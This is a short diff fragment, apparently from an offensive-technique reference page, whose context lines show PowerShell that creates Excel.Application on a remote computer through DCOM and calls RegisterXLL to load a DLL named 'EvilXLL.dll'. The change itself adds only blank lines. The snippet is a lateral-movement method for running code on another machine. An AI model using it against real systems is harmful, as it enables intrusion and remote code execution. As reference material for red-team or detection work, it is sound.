@@ -18,3 +18,5 @@ updated_at: '2023-04-10T20:26:32.005120+00:00'
 $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\"))
 $excel.RegisterXLL(\"EvilXLL.dll\")
 ```
+
+
